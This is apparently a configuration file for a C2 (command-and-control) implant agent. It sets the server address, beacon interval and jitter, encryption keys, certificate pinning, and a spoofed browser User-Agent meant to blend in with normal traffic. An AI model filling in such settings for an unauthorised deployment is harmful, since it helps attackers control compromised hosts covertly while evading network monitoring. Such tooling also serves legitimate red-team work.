# ── C2 Agent Configuration ─────────────────────────────────────────────────────
# Set these before deploying. The generator (dashboard → Generator tab)
# fills these in automatically for generated agents.

C2_SERVER        = "https://127.0.0.1:5000"
API_KEY          = "REPLACE_WITH_C2_API_KEY"   # bootstrap beacon token (from .env C2_API_KEY)

BEACON_INTERVAL  = 30    # base sleep between beacons (seconds)
JITTER           = 10    # ± random offset added each cycle

# AES-256 bootstrap key (64-char hex = 32 bytes).
# Used only for the initial ECDH registration exchange.
# All subsequent beacons use a unique per-session key derived via ECDH + HKDF.
# Must match ENCRYPTION_KEY on the server.
ENCRYPT_BEACON   = True
ENCRYPTION_KEY   = "REPLACE_WITH_ENCRYPTION_KEY"

# SHA-256 fingerprint of the server's TLS certificate (from cert_fingerprint.txt).
# Agent verifies this on first connect — MITM impossible even with verify=False.
# Leave as placeholder to disable pinning in dev/testing.
# Generated agents have the real fingerprint embedded automatically.
CERT_FINGERPRINT = "REPLACE_WITH_gen_cert_OUTPUT"

# User-Agent injected into all HTTP requests to blend with browser traffic
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
